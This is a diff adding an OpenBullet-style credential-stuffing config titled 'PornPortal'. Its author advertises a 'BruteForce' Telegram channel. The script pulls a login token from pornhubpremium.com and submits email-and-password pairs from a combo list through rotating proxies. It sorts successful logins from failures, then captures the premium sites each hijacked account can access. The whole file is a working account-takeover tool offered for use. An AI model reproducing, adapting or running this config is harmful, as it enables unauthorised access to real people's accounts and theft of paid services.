@@ -1,0 +1,85 @@
+[SETTINGS]
+{
+  "Name": "PornPortal",
+  "SuggestedBots": 50,
+  "MaxCPM": 0,
+  "LastModified": "2020-10-16T19:04:05.6690757+03:30",
+  "AdditionalInfo": "Telegram Channel: T.me/BruteForce | Capture | CPM Rate: 10_500",
+  "RequiredPlugins": [],
+  "Author": "@TheOwn",
+  "Version": "1.2.2",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 10,
+  "BanProxyAfterGoodStatus": true,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#Tokens REQUEST GET "https://www.pornhubpremium.com/premium/login" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#TOK PARSE "<SOURCE>" LR "token\" value=\"" "\" />" -> VAR "TOK" 
+
+#Posts REQUEST POST "https://www.pornhubpremium.com/front/authenticate" 
+  CONTENT "username=<USER>&password=<PASS>&redirect=&from=pc_premium_login&segment=straight&token=<TOK>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#Key KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "success\":\"1\",\"message\":\"\",\"redirect" 
+    KEY "premium_redirect_cookie\":\"1\"" 
+  KEYCHAIN Failure OR 
+    KEY "success\":\"0\",\"message\":\"Invalid " 
+    KEY "premium_redirect_cookie\":\"0\",\"" 
+
+#CAP REQUEST GET "https://www.pornhubpremium.com/postlogin" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#TK PARSE "<SOURCE>" LR "var pornportalConfig = {\"data\":\"" "\"" -> VAR "PORTALS TOKEN" 
+
+#GCC REQUEST GET "https://ppp.contentdef.com/postlogin?data=<PORTALS TOKEN>" 
+  
+  HEADER "Host: ppp.contentdef.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Accept: application/json, text/javascript, */*; q=0.01" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+
+#KIR PARSE "<SOURCE>" LR "labelledby=\"dropdown-menu-user\"" "trackid=\"PPBAR-Logout\">" -> VAR "KIR" 
+
+#Sites PARSE "<KIR>" LR "class=\"pp-sub-menu-ico arrow\"></i>" "</a>" Recursive=TRUE CreateEmpty=FALSE -> CAP "Sites" "" "  | Telegram Channel: T.me/BruteForce" 
+
